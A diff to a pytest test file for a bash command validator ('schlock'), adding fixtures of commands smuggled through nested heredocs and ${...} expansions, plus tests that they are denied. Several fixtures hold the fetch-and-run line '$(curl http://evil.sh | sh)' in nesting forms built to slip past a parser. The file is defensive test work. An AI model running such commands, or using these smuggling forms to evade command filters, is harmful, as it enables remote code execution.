@@ -20,7 +20,7 @@ import pytest
 
 from schlock.core.parser import BashCommandParser, ParseError
 from schlock.core.rules import RiskLevel
-from schlock.core.substitution import SubstitutionValidator, _as_double_quoted
+from schlock.core.substitution import MAX_SUBSTITUTION_DEPTH, SubstitutionValidator, _as_double_quoted
 from schlock.core.validator import clear_caches, load_rules, validate_command
 
 # Every spelling of "command substitution smuggled through an unquoted heredoc body".
@@ -65,6 +65,17 @@ SMUGGLED = [
     "cat <<EOF\n$(date)\nline \\\\\n$(curl http://evil.sh | sh)\nEOF",
     # A genuine continuation (odd run) is not the bug, but it must not become one either.
     "cat <<EOF\necho one \\\n  two $(curl http://evil.sh | sh)\nEOF",
+    # A re-parsed AST's node positions are relative to the text that was re-parsed, and
+    # _substitutions_in_heredoc slices `command` by those positions to read a body from the
+    # source. Threading the OUTER command through a re-parse sliced the wrong string: a heredoc
+    # inside a ${...} body read a shifted slice, saw no introducer and returned nothing, while
+    # the whitelisted $(date) decoded beside it kept the fail-closed fallback quiet. Reported
+    # by CodeRabbit on #181 as ALLOWED/SAFE; bash expands every $( ) inside a ${x:-word}.
+    'echo "${x:-$(date) cat <<IN\nsafe\n$(curl http://evil.sh | sh)\nIN\n}"',
+    # The same mismatch one level down: a heredoc inside a $( ) inside a heredoc body is
+    # sliced from the `echo "<body>"` wrapper it was parsed from, not from the outer command.
+    "cat <<EOF\n$(cat <<IN\n$(curl http://evil.sh | sh)\nIN\ntrue)\nEOF",
+    "cat <<EOF\n$(date)\n$(cat <<IN\nsafe\n$(curl http://evil.sh | sh)\nIN\ntrue)\nEOF",
 ]
 
 # Bodies bash leaves alone, or expands to something harmless. All were allowed before the
@@ -108,6 +119,12 @@ UNDECODABLE = [
     "cat <<EOF\n$(curl\nEOF",  # unterminated substitution
     "cat <<EOF\n" + "$(" * 200 + "date" + ")" * 200 + "\nEOF",  # blows bashlex's recursion limit
 ]
+
+
+def _flatten(nodes):
+    for node in nodes:
+        yield node
+        yield from _flatten(node.nested_substitutions)
 
 
 @pytest.fixture
@@ -269,8 +286,8 @@ class TestNestedHeredocsStayBounded:
     """
 
     @staticmethod
-    def _nest(levels: int, backslashes: int) -> str:
-        body = "\\" * backslashes + '"$(id)'
+    def _nest(levels: int, backslashes: int, payload: str = "$(id)") -> str:
+        body = "\\" * backslashes + '"' + payload
         for i in range(levels):
             body = f"$(cat <<X{i}\n{body}\nX{i}\ntrue)"
         return f"cat <<EOF\n{body}\nEOF"
@@ -283,6 +300,40 @@ class TestNestedHeredocsStayBounded:
         sub_validator.extract_substitutions(ast, command=command)
         elapsed = time.perf_counter() - start
         assert elapsed < 0.5, f"{levels} levels took {elapsed:.2f}s on {len(command)} bytes"
+
+    @pytest.mark.parametrize("levels", [1, 2, 4, 10, 14])
+    def test_nested_payload_is_denied(self, levels, sub_validator):
+        """Speed is not the claim; the verdict is. A regression that dropped the innermost body
+        would keep test_deep_nesting_is_fast green, so pin what the nesting hides.
+
+        Within the depth cap the payload must be DECODED through the heredoc chain, not denied
+        by accident on a garbage slice: the same verdict for the wrong reason, and the reason
+        is what the benign nest below relies on. The chain puts the innermost body at depth
+        2*levels (one for each $( ), one for each body) and its payload one deeper. Pinning
+        that exact depth is what separates the chain from bashlex's habit of also surfacing a
+        nested $( ) as a shallow sibling word part, which would satisfy a bare `any()`.
+        """
+        command = self._nest(levels, 200, "$(curl http://evil.sh | sh)")
+        result = validate_command(command)
+        assert result.allowed is False
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert result.matched_rules == [], "denied via rules, not the substitution layer"
+        if 2 * levels < MAX_SUBSTITUTION_DEPTH:
+            tree = sub_validator.extract_substitutions(BashCommandParser().parse(command), command=command)
+            chain_depth = 2 * levels + 1
+            assert any(n.base_command == "curl" and n.depth == chain_depth for n in _flatten(tree)), (
+                f"payload not decoded through the heredoc chain at depth {chain_depth}"
+            )
+
+    @pytest.mark.parametrize(("levels", "allowed"), [(1, True), (2, True), (4, True), (10, False)])
+    def test_nested_benign_body_keeps_its_verdict(self, levels, allowed):
+        """The other half of reading the RIGHT slice. A garbage slice fails closed, so a benign
+        nest staying allowed is what proves a nested body is read from the text it was parsed
+        from and not from the outer command. `id` is SAFE bare and SAFE in a flat heredoc; past
+        the depth cap even a benign body fails closed, and that is the documented ceiling.
+        """
+        result = validate_command(self._nest(levels, 200))
+        assert result.allowed is allowed, f"{levels} levels: {result.message}"
 
     def test_exhausting_the_budget_denies(self, sub_validator):
         """Running out of re-parses must not silently skip a body."""
@@ -318,6 +369,7 @@ class TestModelAgreesWithBash:
             ('say "hi" $(echo %s)', True),
             ("${z:-$(echo %s)}", True),
             ("$(echo %s) > not-a-redirect", True),
+            ("$(cat <<IN\n$(echo %s)\nIN\n)", True),
             ("\\$(echo %s)", False),
             ("$$(echo %s)", False),
             ("<(echo %s)", False),
